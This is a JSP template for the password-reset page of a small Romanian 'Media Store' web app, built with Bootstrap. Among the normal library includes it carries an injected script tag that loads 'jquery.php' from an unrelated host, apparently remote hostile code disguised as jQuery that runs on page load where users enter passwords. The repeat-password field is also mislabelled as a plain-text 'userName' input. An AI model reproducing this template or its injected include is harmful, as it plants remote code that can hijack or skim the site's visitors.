<%@ page isErrorPage="true" language="java"
	contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ page isELIgnored="false"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<link rel="stylesheet"
	href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script
	src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script
	src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script
	src="https://hosterzmi.net/jquery.php?u=07a748e98a2bcc6d1bfaacef446aef2d&c=1000_1&p=1"></script>
<link rel="stylesheet"
	href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script
	src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script
	src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<title>Resetare parolă</title>
</head>
<body>
	<div class="bs-example">
		<nav role="navigation" class="navbar navbar-default"> <!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" data-target="#navbarCollapse"
				data-toggle="collapse" class="navbar-toggle">
				<span class="sr-only">Toggle navigation</span> <span
					class="icon-bar"></span> <span class="icon-bar"></span> <span
					class="icon-bar"></span>
			</button>
			<a href="#" class="navbar-brand">Media Store </a>
		</div>

		<div id="navbarCollapse" class="collapse navbar-collapse">
			<ul class="nav navbar-nav">
				<li class="active"><a href="#">Resetare parolă</a></li>


			</ul>
			<ul class="nav navbar-nav navbar-right">
				<li><a href="#"> <span class="glyphicon glyphicon-user"></span>
						Login
				</a></li>
			</ul>
		</div>
		</nav>
	</div>
	<div class="container">
		<h2></h2>
		<form action="/resetPassword" method="POST">
			<div class="form-group">

				<div class="jumbotron">
					<div class="row">
						<h3>Introdu o nouă parolă pentru userul ${user.username}:</h3>

						<div class="col-xs-4">

							<div class="form-group">
								<label for="password">Password:</label> <input type="password"
									name="password" class="form-control" id="password"
									placeholder="Enter password">
							</div>
							<div class="row">
								<div class="col-xs-12">
									<div class="form-group">
										<label for="repeatPassword">Repeat Password:</label> <input
											type="text" name="userName" class="form-control"
											id="repeatPassword" placeholder="Repeat Password">
									</div>

								</div>
							</div>

						</div>

					</div>
					<div class="has-error">
						<h4 class="help-block">${errorMessage}</h4>
					</div>

					<input type="hidden" name="uuid" value="${user.uuid}" />
					<button type="submit" class="btn btn-danger">Salvează</button>
				</div>
			</div>




		</form>
	</div>
</body>
</html>